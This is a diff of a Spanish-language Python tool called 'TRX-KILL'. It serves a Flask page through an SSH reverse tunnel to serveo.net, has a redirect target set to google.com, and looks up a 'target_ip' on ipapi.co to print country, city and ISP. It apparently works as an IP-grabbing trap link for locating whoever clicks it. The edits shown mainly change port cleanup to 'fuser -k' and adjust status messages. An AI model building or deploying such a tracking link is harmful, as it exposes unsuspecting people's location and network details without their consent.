@@ -11,17 +11,10 @@ from flask import Flask, request, render_template_string
 app = Flask('TRX-KILL')
 URL_FINAL = "https://www.google.com"
 
-# MÉTODO NATIVO PARA LIMPIEZA DE PUERTO
 def force_clean():
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        result = sock.connect_ex(('127.0.0.1', 5000))
-        if result == 0:
-            os.system('pkill -f flask > /dev/null 2>&1')
-            time.sleep(1)
-        sock.close()
-    except:
-        pass
+    # Limpieza robusta del puerto 5000 antes de iniciar
+    os.system('fuser -k 5000/tcp > /dev/null 2>&1')
+    time.sleep(0.5)
 
 HTML_FINAL = """
 <!DOCTYPE html>
@@ -81,7 +74,7 @@ def main():
         elif opc == "2":
             force_clean()
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
-            print("\n\033[1;33m[*] Generando enlace...\033[0m")
+            print("\n\033[1;33m[*] Generando enlace rápido...\033[0m")
             proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             for line in proc.stderr:
                 if "https://" in line:
@@ -109,7 +102,7 @@ def main():
             try:
                 res = requests.get(f"https://ipapi.co/{target_ip}/json/").json()
                 print(f"\n\033[1;32m[+] PAÍS: {res.get('country_name')}\n[+] CIUDAD: {res.get('city')}\n[+] ISP: {res.get('org')}\033[0m")
-            except: print("\033[1;31m[-] Error de conexión.\033[0m")
+            except: print("\n\033[1;31m[-] Error de conexión.\033[0m")
             input("\n[Enter] volver...")
         elif opc == "8": break
 
